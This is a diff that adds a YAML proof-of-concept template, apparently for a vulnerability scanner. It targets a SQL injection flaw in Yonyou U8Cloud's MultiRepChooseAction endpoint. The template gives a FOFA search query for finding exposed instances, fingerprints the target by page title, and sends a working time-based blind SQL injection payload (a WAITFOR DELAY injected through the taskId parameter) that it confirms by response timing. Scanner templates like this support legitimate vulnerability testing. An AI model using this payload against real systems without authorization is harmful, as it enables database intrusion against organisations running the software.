@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-u8cloud-multirepchooseaction-sqli
+info:
+  name: 用友U8Cloud MultiRepChooseAction SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: title=="U8C"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"U8C")
+- method: GET
+  path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.MultiRepChooseAction&method=execute&taskId=1%27);WAITFOR+DELAY+%270:0:{{.t1}}%27--
+  expression: status_code == 200 && contains(body,"选择报表 - iUFO") && contains(body,"当前任务报表")
+    && duration > t1 && duration < t2
+transport: http
